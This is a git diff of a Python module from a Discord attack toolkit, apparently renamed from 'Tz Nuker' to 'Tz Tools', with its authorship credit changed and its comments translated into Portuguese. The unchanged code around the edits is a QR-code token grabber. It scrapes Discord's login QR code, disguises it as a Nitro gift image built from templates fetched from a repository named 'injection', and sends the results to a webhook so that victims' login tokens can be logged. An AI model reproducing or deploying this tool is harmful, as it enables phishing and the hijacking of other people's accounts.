@@ -1,7 +1,6 @@
-# Esse self foi orgulhosamente codificado por Rdimo (https://instagram.com/tzfofo).
+# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
 # Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
-# Tz Nuker sob a Licença Pública Geral GNU v2 (1991).
-
+# Tz Tools sob a Licença Pública Geral GNU v2 (1991).
 
 
 import os
@@ -22,14 +21,14 @@ from colorama import Fore
 from util.plugins.common import getDriver, getheaders, SlowPrint
 
 def logo_qr():
-    #Paste the discord logo onto the QR code
+    #Cole o logotipo do discord no código QR
     im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
     im2 = Image.open('QR-Code/overlay.png', 'r')
     im1.paste(im2, (60, 55), im2)
     im1.save('QR-Code/Qr_Code.png', quality=95)
 
 def paste_template():
-    #paste the finished QR code onto the nitro template
+    #cole o código QR finalizado no modelo nitro
     im1 = Image.open('QR-Code/template.png', 'r')
     im2 = Image.open('QR-Code/Qr_Code.png', 'r')
     im1.paste(im2, (120, 409))
@@ -81,13 +80,13 @@ def QR_Grabber(Webhook):
         input()
         Tz.main()
 
-    driver.get('https://discord.com/login') #get discord url so we can log the token
+    driver.get('https://discord.com/login') #obter url de discórdia para que possamos registrar o token
     sleep(3)
 
     page_source = driver.page_source
     soup = BeautifulSoup(page_source, features='html.parser')
 
-    #Create the QR code
+    #Crie o código QR
     div = soup.find('div', {'class': 'qrCode-2R7t9S'})
     qr_code = div.find('img')['src']
     file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')
@@ -96,7 +95,7 @@ def QR_Grabber(Webhook):
 
     print(f"\n{Fore.WHITE}Download de modelos de código QR")
 
-    # Download qr code templates
+    #Baixe modelos de código QR
     urlretrieve(
         "https://github.com/Tzwebfofo/injection/blob/main/QR-Code.zip?raw=true",
         filename="QR-Code.zip",
@@ -112,7 +111,7 @@ def QR_Grabber(Webhook):
     logo_qr()
     paste_template()
 
-    #remover os modelos
+    #removedor de modelos
     os.remove(os.getcwd()+"\\QR-Code\\overlay.png")
     os.remove(os.getcwd()+"\\QR-Code\\template.png")
     os.remove(os.getcwd()+"\\QR-Code\\temp_qr_code.png")
